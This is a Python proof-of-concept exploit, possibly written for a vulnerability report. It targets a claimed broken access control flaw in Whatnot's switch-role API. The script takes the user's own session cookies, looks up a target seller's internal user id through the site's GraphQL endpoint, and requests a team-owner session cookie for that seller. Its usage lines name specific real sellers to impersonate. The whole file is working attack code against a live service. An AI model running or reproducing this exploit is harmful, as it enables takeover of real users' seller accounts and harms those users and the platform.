#!/usr/bin/env python3
"""
PoC: Whatnot switch-role broken access control (CWE-862/CWE-639)
Any authenticated user can assume ANY other user's team-owner context.

Usage:
  export WN_ACCESS_TOKEN="<__Secure-access-token>"
  export WN_CLAIMS="<__Secure-claims>"
  python3 poc.py coolkicks            # impersonate the top seller
  python3 poc.py invictaflagship      # another seller
  python3 poc.py someusername         # any user
"""
import os, sys, json, base64, urllib.request, urllib.error

UA = "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
ACCESS = os.environ.get("WN_ACCESS_TOKEN", "").strip()
CLAIMS = os.environ.get("WN_CLAIMS", "").strip()

def gql(query, bearer=None):
    req = urllib.request.Request("https://api.whatnot.com/graphql/",
        data=json.dumps({"query": query}).encode(),
        headers={"Content-Type": "application/json", "User-Agent": UA,
                 **({"Authorization": "Bearer " + bearer} if bearer else {})})
    return urllib.request.urlopen(req, timeout=15).read().decode()

def b64(s):
    return base64.b64encode(s.encode()).decode()

def switch_role(target_id, access, claims):
    cookie = f"__Secure-access-token={access}; __Secure-claims={claims}"
    req = urllib.request.Request("https://www.whatnot.com/api/v1/auth/switch-role",
        data=json.dumps({"id": target_id}).encode(), method="POST",
        headers={"Content-Type": "application/json", "User-Agent": UA,
                 "Origin": "https://www.whatnot.com", "Referer": "https://www.whatnot.com/",
                 "Cookie": cookie})
    r = urllib.request.urlopen(req, timeout=15)
    sc = [h for h in r.headers.get_all("Set-Cookie") or [] if "team-owner" in h.lower()]
    print(f"[+] switch-role id={target_id}")
    print(f"    HTTP {r.status}")
    for c in sc:
        print(f"    {c}")

def main():
    if not ACCESS or not CLAIMS:
        sys.exit("Set WN_ACCESS_TOKEN and WN_CLAIMS env vars (from a logged-in browser session).")
    target = sys.argv[1] if len(sys.argv) > 1 else "coolkicks"
    # resolve username -> numeric id
    data = json.loads(gql('{ getUser(username:"%s"){ id username } }' % target))
    pub = data["data"]["getUser"]["id"]                      # PublicUserNode:N
    numeric = pub.split(":")[1]
    private = b64(f"UserNode:{numeric}")                      # UserNode:N (shared numeric value)
    print(f"[*] target {target} -> {pub} -> {private}")
    switch_role(private, ACCESS, CLAIMS)

if __name__ == "__main__":
    main()
